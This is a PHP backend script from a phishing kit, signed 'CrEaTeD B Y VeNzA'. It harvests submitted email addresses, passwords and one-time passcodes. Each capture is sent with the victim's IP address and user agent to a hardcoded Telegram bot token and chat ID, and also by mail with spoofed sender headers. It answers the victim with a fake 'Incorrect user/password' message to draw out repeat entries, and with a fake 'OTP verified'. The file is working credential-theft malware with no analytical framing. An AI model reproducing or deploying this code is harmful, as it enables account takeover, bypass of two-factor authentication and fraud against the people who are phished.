<?php
error_reporting(0);
// Ensure script only processes POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("HTTP/1.1 405 Method Not Allowed");
    exit('Method Not Allowed');
}

// Retrieve and sanitize input
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';
$detail = isset($_POST['detail']) ? trim($_POST['detail']) : '';
$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';

// Initialize additional variables
$chatid = "1185176021";
$botid = "7422668860:AAFQspqWa4IrQgGVW0rYlPOnhA32jwVFkEc";
$emailreslt = "";

if (!empty($email) && !empty($password) && empty($otp)) {
    // Process login with email and password
    // Construct email message
    $message = "|----------| xLs |--------------|\n";
    $message .= "Login From           : " . $detail . "\n";
    $message .= "Online ID            : " . $email . "\n";
    $message .= "Passcode             : " . $password . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "Client IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP={$_SERVER['REMOTE_ADDR']} ----\n";
    $message .= "User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "|----------- CrEaTeD B Y VeNzA --------------|\n";

    $subject = "Login : {$_SERVER['REMOTE_ADDR']}";

    // Example recipient email (modify this with your actual recipient)
    $to = $emailreslt;
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: xforgex <adobe@client_site.com>\r\n";
    mail($to, $subject, $message, $headers);

    // Prepare Telegram message
    $data = ['chat_id' => $chatid, 'text' => $message];
    $website = "https://api.telegram.org/bot{$botid}";
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    // Prepare JSON response
    $response = [
        'signal' => 'ok',
        'msg' => 'Incorrect user/password.. Please try again'
    ];
} elseif (!empty($otp)) {
    // Process OTP verification
    // Construct message with OTP
    $message = "|----------| xLs |--------------|\n";
    $message .= "Online ID            : " . $email . "\n";
    $message .= "OTP                  : " . $otp . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "Client IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP={$_SERVER['REMOTE_ADDR']} ----\n";
    $message .= "User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "|----------- CrEaTeD B Y VeNzA --------------|\n";

    $subject = "OTP Verification : {$_SERVER['REMOTE_ADDR']}";

    // Example recipient email (modify this with your actual recipient)

    $to = $emailreslt;
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: xforgex <shaw@client_site.com>\r\n";
    mail($to, $subject, $message, $headers);

    // Prepare Telegram message
    $data = ['chat_id' => $chatid, 'text' => $message];
    $website = "https://api.telegram.org/bot{$botid}";
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    // Prepare JSON response
    $response = [
        'signal' => 'ok',
        'msg' => 'OTP verified'
    ];
} else {
    // Handle case where fields are empty or invalid request
    $response = [
        'signal' => 'bad',
        'msg' => 'Invalid request'
    ];
}

// Output JSON response
header('Content-Type: application/json');
echo json_encode($response);
?>
